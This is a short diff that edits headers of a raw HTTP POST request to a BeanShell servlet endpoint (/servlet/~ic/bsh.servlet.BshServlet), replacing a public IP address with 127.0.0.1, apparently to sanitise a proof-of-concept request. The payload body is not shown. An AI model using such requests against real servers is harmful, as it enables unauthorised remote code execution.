@@ -18,11 +18,11 @@ Host: 127.0.0.1
 Content-Length:28
 Cache-Control:max-age=0,
 Upgrade-Insecure-Requests:1,
-Origin:http://8.130.46.216:8082
+Origin:http://127.0.0.1
 Content-Type:application/x-www-form-urlencoded
 User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36
 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer:http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet
+Referer:http://127.0.0.1/servlet/~ic/bsh.servlet.BshServlet
 Accept-Encoding:gzip, deflate
 Accept-Language:zh-CN,zh;q=0.9
 Cookie:JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server
